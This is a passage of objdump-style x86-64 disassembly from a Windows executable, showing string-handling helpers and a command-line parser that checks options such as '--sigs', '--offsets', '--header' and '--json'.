   140001d45:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140001d4a:	56                   	push   %rsi
   140001d4b:	57                   	push   %rdi
   140001d4c:	41 56                	push   %r14
   140001d4e:	48 83 ec 30          	sub    $0x30,%rsp
   140001d52:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   140001d56:	49 8b f0             	mov    %r8,%rsi
   140001d59:	48 8b ea             	mov    %rdx,%rbp
   140001d5c:	48 8b d9             	mov    %rcx,%rbx
   140001d5f:	4d 3b c6             	cmp    %r14,%r8
   140001d62:	77 21                	ja     0x140001d85
   140001d64:	48 8b f9             	mov    %rcx,%rdi
   140001d67:	49 83 fe 0f          	cmp    $0xf,%r14
   140001d6b:	76 03                	jbe    0x140001d70
   140001d6d:	48 8b 39             	mov    (%rcx),%rdi
   140001d70:	48 89 71 10          	mov    %rsi,0x10(%rcx)
   140001d74:	48 8b cf             	mov    %rdi,%rcx
   140001d77:	e8 ce 78 00 00       	call   0x14000964a
   140001d7c:	c6 04 37 00          	movb   $0x0,(%rdi,%rsi,1)
   140001d80:	e9 a5 00 00 00       	jmp    0x140001e2a
   140001d85:	48 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdi
   140001d8c:	ff ff 7f 
   140001d8f:	48 3b f7             	cmp    %rdi,%rsi
   140001d92:	0f 87 c2 00 00 00    	ja     0x140001e5a
   140001d98:	48 8b ce             	mov    %rsi,%rcx
   140001d9b:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   140001da0:	48 83 c9 0f          	or     $0xf,%rcx
   140001da4:	48 3b cf             	cmp    %rdi,%rcx
   140001da7:	77 1f                	ja     0x140001dc8
   140001da9:	49 8b d6             	mov    %r14,%rdx
   140001dac:	48 8b c7             	mov    %rdi,%rax
   140001daf:	48 d1 ea             	shr    $1,%rdx
   140001db2:	48 2b c2             	sub    %rdx,%rax
   140001db5:	4c 3b f0             	cmp    %rax,%r14
   140001db8:	77 0e                	ja     0x140001dc8
   140001dba:	49 8d 04 16          	lea    (%r14,%rdx,1),%rax
   140001dbe:	48 8b f9             	mov    %rcx,%rdi
   140001dc1:	48 3b c8             	cmp    %rax,%rcx
   140001dc4:	48 0f 42 f8          	cmovb  %rax,%rdi
   140001dc8:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   140001dcc:	e8 ef f4 ff ff       	call   0x1400012c0
   140001dd1:	4c 8b c6             	mov    %rsi,%r8
   140001dd4:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   140001dd8:	48 8b d5             	mov    %rbp,%rdx
   140001ddb:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   140001ddf:	48 8b c8             	mov    %rax,%rcx
   140001de2:	4c 8b f8             	mov    %rax,%r15
   140001de5:	e8 5a 78 00 00       	call   0x140009644
   140001dea:	41 c6 04 37 00       	movb   $0x0,(%r15,%rsi,1)
   140001def:	49 83 fe 0f          	cmp    $0xf,%r14
   140001df3:	76 2d                	jbe    0x140001e22
   140001df5:	48 8b 0b             	mov    (%rbx),%rcx
   140001df8:	49 8d 56 01          	lea    0x1(%r14),%rdx
   140001dfc:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001e03:	72 18                	jb     0x140001e1d
   140001e05:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140001e09:	48 83 c2 27          	add    $0x27,%rdx
   140001e0d:	48 2b c8             	sub    %rax,%rcx
   140001e10:	48 83 e9 08          	sub    $0x8,%rcx
   140001e14:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140001e18:	77 26                	ja     0x140001e40
   140001e1a:	48 8b c8             	mov    %rax,%rcx
   140001e1d:	e8 b6 69 00 00       	call   0x1400087d8
   140001e22:	4c 89 3b             	mov    %r15,(%rbx)
   140001e25:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   140001e2a:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140001e2f:	48 8b c3             	mov    %rbx,%rax
   140001e32:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140001e37:	48 83 c4 30          	add    $0x30,%rsp
   140001e3b:	41 5e                	pop    %r14
   140001e3d:	5f                   	pop    %rdi
   140001e3e:	5e                   	pop    %rsi
   140001e3f:	c3                   	ret
   140001e40:	45 33 c9             	xor    %r9d,%r9d
   140001e43:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001e4a:	00 00 
   140001e4c:	45 33 c0             	xor    %r8d,%r8d
   140001e4f:	33 d2                	xor    %edx,%edx
   140001e51:	33 c9                	xor    %ecx,%ecx
   140001e53:	ff 15 0f 86 00 00    	call   *0x860f(%rip)        # 0x14000a468
   140001e59:	cc                   	int3
   140001e5a:	e8 a1 fe ff ff       	call   0x140001d00
   140001e5f:	cc                   	int3
   140001e60:	48 83 ec 38          	sub    $0x38,%rsp
   140001e64:	48 8b c2             	mov    %rdx,%rax
   140001e67:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   140001e6e:	72 18                	jb     0x140001e88
   140001e70:	48 8b 4a f8          	mov    -0x8(%rdx),%rcx
   140001e74:	49 83 c0 27          	add    $0x27,%r8
   140001e78:	48 2b c1             	sub    %rcx,%rax
   140001e7b:	48 83 e8 08          	sub    $0x8,%rax
   140001e7f:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001e83:	77 12                	ja     0x140001e97
   140001e85:	48 8b c1             	mov    %rcx,%rax
   140001e88:	49 8b d0             	mov    %r8,%rdx
   140001e8b:	48 8b c8             	mov    %rax,%rcx
   140001e8e:	48 83 c4 38          	add    $0x38,%rsp
   140001e92:	e9 41 69 00 00       	jmp    0x1400087d8
   140001e97:	45 33 c9             	xor    %r9d,%r9d
   140001e9a:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001ea1:	00 00 
   140001ea3:	45 33 c0             	xor    %r8d,%r8d
   140001ea6:	33 d2                	xor    %edx,%edx
   140001ea8:	33 c9                	xor    %ecx,%ecx
   140001eaa:	ff 15 b8 85 00 00    	call   *0x85b8(%rip)        # 0x14000a468
   140001eb0:	cc                   	int3
   140001eb1:	cc                   	int3
   140001eb2:	cc                   	int3
   140001eb3:	cc                   	int3
   140001eb4:	cc                   	int3
   140001eb5:	cc                   	int3
   140001eb6:	cc                   	int3
   140001eb7:	cc                   	int3
   140001eb8:	cc                   	int3
   140001eb9:	cc                   	int3
   140001eba:	cc                   	int3
   140001ebb:	cc                   	int3
   140001ebc:	cc                   	int3
   140001ebd:	cc                   	int3
   140001ebe:	cc                   	int3
   140001ebf:	cc                   	int3
   140001ec0:	48 83 ec 38          	sub    $0x38,%rsp
   140001ec4:	48 8b c2             	mov    %rdx,%rax
   140001ec7:	4b 8d 14 40          	lea    (%r8,%r8,2),%rdx
   140001ecb:	48 c1 e2 03          	shl    $0x3,%rdx
   140001ecf:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001ed6:	72 18                	jb     0x140001ef0
   140001ed8:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140001edc:	48 83 c2 27          	add    $0x27,%rdx
   140001ee0:	48 2b c1             	sub    %rcx,%rax
   140001ee3:	48 83 e8 08          	sub    $0x8,%rax
   140001ee7:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001eeb:	77 0f                	ja     0x140001efc
   140001eed:	48 8b c1             	mov    %rcx,%rax
   140001ef0:	48 8b c8             	mov    %rax,%rcx
   140001ef3:	48 83 c4 38          	add    $0x38,%rsp
   140001ef7:	e9 dc 68 00 00       	jmp    0x1400087d8
   140001efc:	45 33 c9             	xor    %r9d,%r9d
   140001eff:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001f06:	00 00 
   140001f08:	45 33 c0             	xor    %r8d,%r8d
   140001f0b:	33 d2                	xor    %edx,%edx
   140001f0d:	33 c9                	xor    %ecx,%ecx
   140001f0f:	ff 15 53 85 00 00    	call   *0x8553(%rip)        # 0x14000a468
   140001f15:	cc                   	int3
   140001f16:	cc                   	int3
   140001f17:	cc                   	int3
   140001f18:	cc                   	int3
   140001f19:	cc                   	int3
   140001f1a:	cc                   	int3
   140001f1b:	cc                   	int3
   140001f1c:	cc                   	int3
   140001f1d:	cc                   	int3
   140001f1e:	cc                   	int3
   140001f1f:	cc                   	int3
   140001f20:	48 83 ec 38          	sub    $0x38,%rsp
   140001f24:	48 8b c2             	mov    %rdx,%rax
   140001f27:	4b 8d 14 80          	lea    (%r8,%r8,4),%rdx
   140001f2b:	48 c1 e2 03          	shl    $0x3,%rdx
   140001f2f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001f36:	72 18                	jb     0x140001f50
   140001f38:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140001f3c:	48 83 c2 27          	add    $0x27,%rdx
   140001f40:	48 2b c1             	sub    %rcx,%rax
   140001f43:	48 83 e8 08          	sub    $0x8,%rax
   140001f47:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001f4b:	77 0f                	ja     0x140001f5c
   140001f4d:	48 8b c1             	mov    %rcx,%rax
   140001f50:	48 8b c8             	mov    %rax,%rcx
   140001f53:	48 83 c4 38          	add    $0x38,%rsp
   140001f57:	e9 7c 68 00 00       	jmp    0x1400087d8
   140001f5c:	45 33 c9             	xor    %r9d,%r9d
   140001f5f:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001f66:	00 00 
   140001f68:	45 33 c0             	xor    %r8d,%r8d
   140001f6b:	33 d2                	xor    %edx,%edx
   140001f6d:	33 c9                	xor    %ecx,%ecx
   140001f6f:	ff 15 f3 84 00 00    	call   *0x84f3(%rip)        # 0x14000a468
   140001f75:	cc                   	int3
   140001f76:	cc                   	int3
   140001f77:	cc                   	int3
   140001f78:	cc                   	int3
   140001f79:	cc                   	int3
   140001f7a:	cc                   	int3
   140001f7b:	cc                   	int3
   140001f7c:	cc                   	int3
   140001f7d:	cc                   	int3
   140001f7e:	cc                   	int3
   140001f7f:	cc                   	int3
   140001f80:	40 53                	rex push %rbx
   140001f82:	48 83 ec 20          	sub    $0x20,%rsp
   140001f86:	ba 00 02 00 00       	mov    $0x200,%edx
   140001f8b:	41 b8 00 0e 00 00    	mov    $0xe00,%r8d
   140001f91:	48 8b d9             	mov    %rcx,%rbx
   140001f94:	ff 15 46 83 00 00    	call   *0x8346(%rip)        # 0x14000a2e0
   140001f9a:	48 8b c3             	mov    %rbx,%rax
   140001f9d:	48 83 c4 20          	add    $0x20,%rsp
   140001fa1:	5b                   	pop    %rbx
   140001fa2:	c3                   	ret
   140001fa3:	cc                   	int3
   140001fa4:	cc                   	int3
   140001fa5:	cc                   	int3
   140001fa6:	cc                   	int3
   140001fa7:	cc                   	int3
   140001fa8:	cc                   	int3
   140001fa9:	cc                   	int3
   140001faa:	cc                   	int3
   140001fab:	cc                   	int3
   140001fac:	cc                   	int3
   140001fad:	cc                   	int3
   140001fae:	cc                   	int3
   140001faf:	cc                   	int3
   140001fb0:	40 53                	rex push %rbx
   140001fb2:	48 83 ec 20          	sub    $0x20,%rsp
   140001fb6:	ba 00 08 00 00       	mov    $0x800,%edx
   140001fbb:	41 b8 00 0e 00 00    	mov    $0xe00,%r8d
   140001fc1:	48 8b d9             	mov    %rcx,%rbx
   140001fc4:	ff 15 16 83 00 00    	call   *0x8316(%rip)        # 0x14000a2e0
   140001fca:	48 8b c3             	mov    %rbx,%rax
   140001fcd:	48 83 c4 20          	add    $0x20,%rsp
   140001fd1:	5b                   	pop    %rbx
   140001fd2:	c3                   	ret
   140001fd3:	cc                   	int3
   140001fd4:	cc                   	int3
   140001fd5:	cc                   	int3
   140001fd6:	cc                   	int3
   140001fd7:	cc                   	int3
   140001fd8:	cc                   	int3
   140001fd9:	cc                   	int3
   140001fda:	cc                   	int3
   140001fdb:	cc                   	int3
   140001fdc:	cc                   	int3
   140001fdd:	cc                   	int3
   140001fde:	cc                   	int3
   140001fdf:	cc                   	int3
   140001fe0:	48 83 ec 28          	sub    $0x28,%rsp
   140001fe4:	48 8b 0d 05 81 00 00 	mov    0x8105(%rip),%rcx        # 0x14000a0f0
   140001feb:	48 8d 15 b6 86 00 00 	lea    0x86b6(%rip),%rdx        # 0x14000a6a8
   140001ff2:	e8 59 f0 ff ff       	call   0x140001050
   140001ff7:	48 8b 0d f2 80 00 00 	mov    0x80f2(%rip),%rcx        # 0x14000a0f0
   140001ffe:	48 8d 15 b3 86 00 00 	lea    0x86b3(%rip),%rdx        # 0x14000a6b8
   140002005:	e8 46 f0 ff ff       	call   0x140001050
   14000200a:	48 8b c8             	mov    %rax,%rcx
   14000200d:	48 8d 15 9c 86 00 00 	lea    0x869c(%rip),%rdx        # 0x14000a6b0
   140002014:	e8 37 f0 ff ff       	call   0x140001050
   140002019:	48 8b c8             	mov    %rax,%rcx
   14000201c:	48 8d 15 85 86 00 00 	lea    0x8685(%rip),%rdx        # 0x14000a6a8
   140002023:	e8 28 f0 ff ff       	call   0x140001050
   140002028:	48 8b 0d c1 80 00 00 	mov    0x80c1(%rip),%rcx        # 0x14000a0f0
   14000202f:	48 8d 15 9a 86 00 00 	lea    0x869a(%rip),%rdx        # 0x14000a6d0
   140002036:	e8 15 f0 ff ff       	call   0x140001050
   14000203b:	48 8b c8             	mov    %rax,%rcx
   14000203e:	48 8d 15 83 86 00 00 	lea    0x8683(%rip),%rdx        # 0x14000a6c8
   140002045:	e8 06 f0 ff ff       	call   0x140001050
   14000204a:	48 8b c8             	mov    %rax,%rcx
   14000204d:	48 8d 15 54 86 00 00 	lea    0x8654(%rip),%rdx        # 0x14000a6a8
   140002054:	e8 f7 ef ff ff       	call   0x140001050
   140002059:	48 8b 0d 90 80 00 00 	mov    0x8090(%rip),%rcx        # 0x14000a0f0
   140002060:	48 8d 15 41 86 00 00 	lea    0x8641(%rip),%rdx        # 0x14000a6a8
   140002067:	48 83 c4 28          	add    $0x28,%rsp
   14000206b:	e9 e0 ef ff ff       	jmp    0x140001050
   140002070:	48 83 ec 28          	sub    $0x28,%rsp
   140002074:	48 8b 0d 75 80 00 00 	mov    0x8075(%rip),%rcx        # 0x14000a0f0
   14000207b:	48 8d 15 56 86 00 00 	lea    0x8656(%rip),%rdx        # 0x14000a6d8
   140002082:	e8 c9 ef ff ff       	call   0x140001050
   140002087:	48 8b 0d 62 80 00 00 	mov    0x8062(%rip),%rcx        # 0x14000a0f0
   14000208e:	48 8d 15 63 86 00 00 	lea    0x8663(%rip),%rdx        # 0x14000a6f8
   140002095:	e8 b6 ef ff ff       	call   0x140001050
   14000209a:	48 8b 0d 4f 80 00 00 	mov    0x804f(%rip),%rcx        # 0x14000a0f0
   1400020a1:	48 8d 15 88 86 00 00 	lea    0x8688(%rip),%rdx        # 0x14000a730
   1400020a8:	e8 a3 ef ff ff       	call   0x140001050
   1400020ad:	48 8b 0d 3c 80 00 00 	mov    0x803c(%rip),%rcx        # 0x14000a0f0
   1400020b4:	48 8d 15 9d 86 00 00 	lea    0x869d(%rip),%rdx        # 0x14000a758
   1400020bb:	e8 90 ef ff ff       	call   0x140001050
   1400020c0:	48 8b 0d 29 80 00 00 	mov    0x8029(%rip),%rcx        # 0x14000a0f0
   1400020c7:	48 8d 15 b2 86 00 00 	lea    0x86b2(%rip),%rdx        # 0x14000a780
   1400020ce:	e8 7d ef ff ff       	call   0x140001050
   1400020d3:	48 8b 0d 16 80 00 00 	mov    0x8016(%rip),%rcx        # 0x14000a0f0
   1400020da:	48 8d 15 c7 86 00 00 	lea    0x86c7(%rip),%rdx        # 0x14000a7a8
   1400020e1:	e8 6a ef ff ff       	call   0x140001050
   1400020e6:	48 8b 0d 03 80 00 00 	mov    0x8003(%rip),%rcx        # 0x14000a0f0
   1400020ed:	48 8d 15 d4 86 00 00 	lea    0x86d4(%rip),%rdx        # 0x14000a7c8
   1400020f4:	e8 57 ef ff ff       	call   0x140001050
   1400020f9:	48 8b 0d f0 7f 00 00 	mov    0x7ff0(%rip),%rcx        # 0x14000a0f0
   140002100:	48 8d 15 f1 86 00 00 	lea    0x86f1(%rip),%rdx        # 0x14000a7f8
   140002107:	e8 44 ef ff ff       	call   0x140001050
   14000210c:	48 8b 0d dd 7f 00 00 	mov    0x7fdd(%rip),%rcx        # 0x14000a0f0
   140002113:	48 8d 15 fe 86 00 00 	lea    0x86fe(%rip),%rdx        # 0x14000a818
   14000211a:	e8 31 ef ff ff       	call   0x140001050
   14000211f:	48 8b 0d ca 7f 00 00 	mov    0x7fca(%rip),%rcx        # 0x14000a0f0
   140002126:	48 8d 15 7b 85 00 00 	lea    0x857b(%rip),%rdx        # 0x14000a6a8
   14000212d:	48 83 c4 28          	add    $0x28,%rsp
   140002131:	e9 1a ef ff ff       	jmp    0x140001050
   140002136:	cc                   	int3
   140002137:	cc                   	int3
   140002138:	cc                   	int3
   140002139:	cc                   	int3
   14000213a:	cc                   	int3
   14000213b:	cc                   	int3
   14000213c:	cc                   	int3
   14000213d:	cc                   	int3
   14000213e:	cc                   	int3
   14000213f:	cc                   	int3
   140002140:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140002144:	48 8d 05 ed 84 00 00 	lea    0x84ed(%rip),%rax        # 0x14000a638
   14000214b:	48 85 d2             	test   %rdx,%rdx
   14000214e:	48 0f 45 c2          	cmovne %rdx,%rax
   140002152:	c3                   	ret
   140002153:	cc                   	int3
   140002154:	cc                   	int3
   140002155:	cc                   	int3
   140002156:	cc                   	int3
   140002157:	cc                   	int3
   140002158:	cc                   	int3
   140002159:	cc                   	int3
   14000215a:	cc                   	int3
   14000215b:	cc                   	int3
   14000215c:	cc                   	int3
   14000215d:	cc                   	int3
   14000215e:	cc                   	int3
   14000215f:	cc                   	int3
   140002160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002165:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000216a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000216f:	55                   	push   %rbp
   140002170:	41 54                	push   %r12
   140002172:	41 55                	push   %r13
   140002174:	41 56                	push   %r14
   140002176:	41 57                	push   %r15
   140002178:	48 8d 6c 24 90       	lea    -0x70(%rsp),%rbp
   14000217d:	48 81 ec 70 01 00 00 	sub    $0x170,%rsp
   140002184:	48 8b 05 35 0a 01 00 	mov    0x10a35(%rip),%rax        # 0x140012bc0
   14000218b:	48 33 c4             	xor    %rsp,%rax
   14000218e:	48 89 45 68          	mov    %rax,0x68(%rbp)
   140002192:	48 89 55 c0          	mov    %rdx,-0x40(%rbp)
   140002196:	48 63 c1             	movslq %ecx,%rax
   140002199:	89 45 98             	mov    %eax,-0x68(%rbp)
   14000219c:	45 33 db             	xor    %r11d,%r11d
   14000219f:	45 8b f3             	mov    %r11d,%r14d
   1400021a2:	44 89 5c 24 38       	mov    %r11d,0x38(%rsp)
   1400021a7:	45 32 c9             	xor    %r9b,%r9b
   1400021aa:	44 88 4c 24 33       	mov    %r9b,0x33(%rsp)
   1400021af:	45 32 d2             	xor    %r10b,%r10b
   1400021b2:	44 88 54 24 34       	mov    %r10b,0x34(%rsp)
   1400021b7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400021ba:	0f 11 45 28          	movups %xmm0,0x28(%rbp)
   1400021be:	41 8b fb             	mov    %r11d,%edi
   1400021c1:	4c 89 5d 38          	mov    %r11,0x38(%rbp)
   1400021c5:	be 0f 00 00 00       	mov    $0xf,%esi
   1400021ca:	48 89 75 40          	mov    %rsi,0x40(%rbp)
   1400021ce:	40 88 7d 28          	mov    %dil,0x28(%rbp)
   1400021d2:	83 f8 02             	cmp    $0x2,%eax
   1400021d5:	0f 9c c3             	setl   %bl
   1400021d8:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400021dd:	89 4c 24 3c          	mov    %ecx,0x3c(%rsp)
   1400021e1:	44 0f b6 e3          	movzbl %bl,%r12d
   1400021e5:	44 0f b6 c3          	movzbl %bl,%r8d
   1400021e9:	88 5c 24 31          	mov    %bl,0x31(%rsp)
   1400021ed:	49 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r13
   1400021f4:	ff ff 7f 
   1400021f7:	4c 8b 7d 28          	mov    0x28(%rbp),%r15
   1400021fb:	3b c1                	cmp    %ecx,%eax
   1400021fd:	0f 8e 36 04 00 00    	jle    0x140002639
   140002203:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140002207:	88 5c 24 32          	mov    %bl,0x32(%rsp)
   14000220b:	88 5c 24 31          	mov    %bl,0x31(%rsp)
   14000220f:	44 8b e1             	mov    %ecx,%r12d
   140002212:	88 5c 24 30          	mov    %bl,0x30(%rsp)
   140002216:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000221d:	00 00 00 
   140002220:	4a 8b 1c e2          	mov    (%rdx,%r12,8),%rbx
   140002224:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002227:	0f 11 45 08          	movups %xmm0,0x8(%rbp)
   14000222b:	4c 89 5d 18          	mov    %r11,0x18(%rbp)
   14000222f:	4c 89 5d 20          	mov    %r11,0x20(%rbp)
   140002233:	48 8b cb             	mov    %rbx,%rcx
   140002236:	e8 2d 74 00 00       	call   0x140009668
   14000223b:	4c 8b c0             	mov    %rax,%r8
   14000223e:	48 8b d3             	mov    %rbx,%rdx
   140002241:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   140002245:	e8 c6 f3 ff ff       	call   0x140001610
   14000224a:	90                   	nop
   14000224b:	4c 8d 45 08          	lea    0x8(%rbp),%r8
   14000224f:	48 8b 45 08          	mov    0x8(%rbp),%rax
   140002253:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140002257:	48 83 f9 0f          	cmp    $0xf,%rcx
   14000225b:	4c 0f 47 c0          	cmova  %rax,%r8
   14000225f:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140002263:	48 83 fa 05          	cmp    $0x5,%rdx
   140002267:	75 1f                	jne    0x140002288
   140002269:	41 81 38 2d 2d 61 6c 	cmpl   $0x6c612d2d,(%r8)
   140002270:	75 16                	jne    0x140002288
   140002272:	41 80 78 04 6c       	cmpb   $0x6c,0x4(%r8)
   140002277:	75 0f                	jne    0x140002288
   140002279:	b3 01                	mov    $0x1,%bl
   14000227b:	88 5c 24 30          	mov    %bl,0x30(%rsp)
   14000227f:	88 5c 24 32          	mov    %bl,0x32(%rsp)
   140002283:	e9 22 02 00 00       	jmp    0x1400024aa
   140002288:	4c 8d 45 08          	lea    0x8(%rbp),%r8
   14000228c:	48 83 f9 0f          	cmp    $0xf,%rcx
   140002290:	4c 0f 47 c0          	cmova  %rax,%r8
   140002294:	48 83 fa 06          	cmp    $0x6,%rdx
   140002298:	75 1d                	jne    0x1400022b7
   14000229a:	41 81 38 2d 2d 73 69 	cmpl   $0x69732d2d,(%r8)
   1400022a1:	75 14                	jne    0x1400022b7
   1400022a3:	66 41 81 78 04 67 73 	cmpw   $0x7367,0x4(%r8)
   1400022aa:	75 0b                	jne    0x1400022b7
   1400022ac:	b3 01                	mov    $0x1,%bl
   1400022ae:	88 5c 24 30          	mov    %bl,0x30(%rsp)
   1400022b2:	e9 f3 01 00 00       	jmp    0x1400024aa
   1400022b7:	4c 8d 45 08          	lea    0x8(%rbp),%r8
   1400022bb:	48 83 f9 0f          	cmp    $0xf,%rcx
   1400022bf:	4c 0f 47 c0          	cmova  %rax,%r8
   1400022c3:	48 83 fa 09          	cmp    $0x9,%rdx
   1400022c7:	75 20                	jne    0x1400022e9
   1400022c9:	49 b9 2d 2d 6f 66 66 	movabs $0x74657366666f2d2d,%r9
   1400022d0:	73 65 74 
   1400022d3:	4d 39 08             	cmp    %r9,(%r8)
   1400022d6:	75 11                	jne    0x1400022e9
   1400022d8:	41 80 78 08 73       	cmpb   $0x73,0x8(%r8)
   1400022dd:	75 0a                	jne    0x1400022e9
   1400022df:	c6 44 24 32 01       	movb   $0x1,0x32(%rsp)
   1400022e4:	e9 bc 01 00 00       	jmp    0x1400024a5
   1400022e9:	4c 8d 45 08          	lea    0x8(%rbp),%r8
   1400022ed:	48 83 f9 0f          	cmp    $0xf,%rcx
   1400022f1:	4c 0f 47 c0          	cmova  %rax,%r8
   1400022f5:	48 83 fa 08          	cmp    $0x8,%rdx
   1400022f9:	75 19                	jne    0x140002314
   1400022fb:	49 b9 2d 2d 68 65 61 	movabs $0x7265646165682d2d,%r9
   140002302:	64 65 72 
   140002305:	4d 39 08             	cmp    %r9,(%r8)
   140002308:	75 0a                	jne    0x140002314
   14000230a:	c6 44 24 33 01       	movb   $0x1,0x33(%rsp)
   14000230f:	e9 91 01 00 00       	jmp    0x1400024a5
   140002314:	4c 8d 45 08          	lea    0x8(%rbp),%r8
   140002318:	48 83 f9 0f          	cmp    $0xf,%rcx
   14000231c:	4c 0f 47 c0          	cmova  %rax,%r8
   140002320:	48 83 fa 06          	cmp    $0x6,%rdx
   140002324:	75 1c                	jne    0x140002342
   140002326:	41 81 38 2d 2d 6a 73 	cmpl   $0x736a2d2d,(%r8)
   14000232d:	75 13                	jne    0x140002342
   14000232f:	66 41 81 78 04 6f 6e 	cmpw   $0x6e6f,0x4(%r8)
   140002336:	75 0a                	jne    0x140002342
   140002338:	c6 44 24 34 01       	movb   $0x1,0x34(%rsp)
   14000233d:	e9 63 01 00 00       	jmp    0x1400024a5
   140002342:	4c 8d 45 08          	lea    0x8(%rbp),%r8
   140002346:	48 83 f9 0f          	cmp    $0xf,%rcx
   14000234a:	4c 0f 47 c0          	cmova  %rax,%r8
   14000234e:	48 83 fa 05          	cmp    $0x5,%rdx
   140002352:	75 1a                	jne    0x14000236e
   140002354:	41 81 38 2d 2d 74 78 	cmpl   $0x78742d2d,(%r8)
   14000235b:	75 11                	jne    0x14000236e
   14000235d:	41 80 78 04 74       	cmpb   $0x74,0x4(%r8)
   140002362:	75 0a                	jne    0x14000236e
   140002364:	c6 44 24 31 01       	movb   $0x1,0x31(%rsp)
   140002369:	e9 37 01 00 00       	jmp    0x1400024a5
   14000236e:	4c 8d 45 08          	lea    0x8(%rbp),%r8
   140002372:	48 83 f9 0f          	cmp    $0xf,%rcx
   140002376:	4c 0f 47 c0          	cmova  %rax,%r8
   14000237a:	48 83 fa 02          	cmp    $0x2,%rdx
   14000237e:	0f 85 ac 01 00 00    	jne    0x140002530
   140002384:	66 41 81 38 2d 6f    	cmpw   $0x6f2d,(%r8)
   14000238a:	0f 85 a0 01 00 00    	jne    0x140002530
   140002390:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   140002394:	ff c0                	inc    %eax
   140002396:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
   14000239a:	3b 45 98             	cmp    -0x68(%rbp),%eax
   14000239d:	0f 8d 75 01 00 00    	jge    0x140002518
   1400023a3:	49 ff c4             	inc    %r12
   1400023a6:	4c 89 65 a0          	mov    %r12,-0x60(%rbp)
   1400023aa:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   1400023ae:	4e 8b 24 e0          	mov    (%rax,%r12,8),%r12
   1400023b2:	4c 89 65 c8          	mov    %r12,-0x38(%rbp)
   1400023b6:	49 8b cc             	mov    %r12,%rcx
   1400023b9:	e8 aa 72 00 00       	call   0x140009668
   1400023be:	48 8b f8             	mov    %rax,%rdi
   1400023c1:	48 3b c6             	cmp    %rsi,%rax
   1400023c4:	77 33                	ja     0x1400023f9
   1400023c6:	48 8d 5d 28          	lea    0x28(%rbp),%rbx
   1400023ca:	48 83 fe 0f          	cmp    $0xf,%rsi
   1400023ce:	49 0f 47 df          	cmova  %r15,%rbx
   1400023d2:	48 89 45 38          	mov    %rax,0x38(%rbp)
   1400023d6:	4c 8b c0             	mov    %rax,%r8
   1400023d9:	49 8b d4             	mov    %r12,%rdx
   1400023dc:	48 8b cb             	mov    %rbx,%rcx
   1400023df:	e8 66 72 00 00       	call   0x14000964a
   1400023e4:	c6 04 3b 00          	movb   $0x0,(%rbx,%rdi,1)
   1400023e8:	48 8b 75 40          	mov    0x40(%rbp),%rsi
   1400023ec:	48 8b 7d 38          	mov    0x38(%rbp),%rdi
   1400023f0:	4c 8b 7d 28          	mov    0x28(%rbp),%r15
   1400023f4:	e9 a0 00 00 00       	jmp    0x140002499
   1400023f9:	49 3b fd             	cmp    %r13,%rdi
   1400023fc:	0f 87 e2 0c 00 00    	ja     0x1400030e4
   140002402:	48 8b de             	mov    %rsi,%rbx
   140002405:	48 8b f7             	mov    %rdi,%rsi
   140002408:	48 83 ce 0f          	or     $0xf,%rsi
   14000240c:	49 3b f5             	cmp    %r13,%rsi
   14000240f:	76 05                	jbe    0x140002416
   140002411:	49 8b f5             	mov    %r13,%rsi
   140002414:	eb 21                	jmp    0x140002437
   140002416:	48 8b cb             	mov    %rbx,%rcx
   140002419:	48 d1 e9             	shr    $1,%rcx
   14000241c:	49 8b c5             	mov    %r13,%rax
   14000241f:	48 2b c1             	sub    %rcx,%rax
   140002422:	48 3b d8             	cmp    %rax,%rbx
   140002425:	76 05                	jbe    0x14000242c
   140002427:	49 8b f5             	mov    %r13,%rsi
   14000242a:	eb 0b                	jmp    0x140002437
   14000242c:	48 8d 04 19          	lea    (%rcx,%rbx,1),%rax
   140002430:	48 3b f0             	cmp    %rax,%rsi
   140002433:	48 0f 42 f0          	cmovb  %rax,%rsi
   140002437:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   14000243b:	e8 80 ee ff ff       	call   0x1400012c0
   140002440:	4c 8b e0             	mov    %rax,%r12
   140002443:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140002447:	48 89 75 40          	mov    %rsi,0x40(%rbp)
   14000244b:	4c 8b c7             	mov    %rdi,%r8
   14000244e:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
